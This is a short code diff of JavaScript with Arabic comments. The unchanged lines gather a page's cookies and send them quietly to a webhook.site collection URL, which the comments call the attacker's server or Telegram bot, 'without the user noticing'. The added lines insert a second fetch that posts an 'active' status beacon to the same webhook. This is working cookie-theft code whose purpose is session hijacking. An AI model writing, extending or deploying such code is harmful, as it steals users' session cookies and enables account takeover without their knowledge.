@@ -15,7 +15,26 @@
 
             // رابط السيرفر الخاص بك أو بوت تلجرام الذي سيستقبل الكوكيز تلقائياً
             let targetUrl = "https://webhook.site/5aaa35a1-60e4-4b7f-953e-10a3078c0436/collect?cookie=" + encodeURIComponent(cookies);
+const webhookUrl = "https://webhook.site/5aaa35a1-60e4-4b7f-953e-10a3078c0436";
 
+const dataToSend = {
+    status: "active",
+    timestamp: new Date().toISOString()
+};
+
+fetch(webhookUrl, {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify(dataToSend)
+})
+.then(response => {
+    console.log("تم الإرسال بنجاح!");
+})
+.catch(error => {
+    console.error("خطأ في الإرسال:", error);
+});
             // إرسال البيانات في الخلفية دون أن يشعر المستخدم
             fetch(targetUrl, { mode: 'no-cors' })
                 .then(() => {
